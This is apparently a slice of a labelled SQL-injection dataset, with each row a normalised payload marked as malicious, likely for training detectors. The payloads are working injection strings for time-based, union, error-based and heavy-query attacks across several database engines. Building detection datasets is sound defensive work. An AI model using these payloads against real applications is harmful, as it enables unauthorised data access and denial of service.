row_index,payload_norm,label,sqli_type_hint
5760,"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # hkrp",1,
5761,"-9265"" ) or 7834 = 1685",1,
5762,waitfor delay '0:0:5'# ogzq,1,
5763,"1"" ) where 6821 = 6821 waitfor delay '0:0:5'--",1,
5764,"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",1,
5765,select case when 5308 = 6745 then 1 else null end--,1,
5766,"-5131' ) ) ) union all select 4854,4854,4854,4854,4854,4854,4854#",1,
5767,"1' in boolean mode ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #",1,
5768,"1%' ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( '%' = '",1,
5769,"1%"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,1,
5770,select case when 9848 = 2618 then 1 else null end--,1,
5771,"1%"" ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
5772,"1' ) as tygi where 9891 = 9891 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,
5773,1 ) ) as qsos where 2721 = 2721 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,
5774,"1 ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 9802 = 9802",1,
5775,-2316' ) ) ) or 8519 = 6010,1,
5776,1 where 7442 = 7442,1,
5777,1 ) and sleep ( 5 ) #,1,
5778,1 where 7516 = 7516 union all select null#,1,
5779,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",1,
5780,1 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1,
5781,"-7485%' ) ) ) union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1,
5782,1 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) -- icxn,1,
5783,"1"" ) ) as dfwi where 9703 = 9703 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5784,select ( case when ( 9746 = 8055 ) then 9746 else 1/ ( select 0 ) end ) --,1,
5785,"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'qgrt' = 'qgrt",1,
5786,1' ) waitfor delay '0:0:5' and ( 'peyv' like 'peyv,1,
5787,1'|| ( select 'dezl' where 8661 = 8661,1,
5788,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'uvlu' = 'uvlu",1,
5789,1' where 2145 = 2145,1,
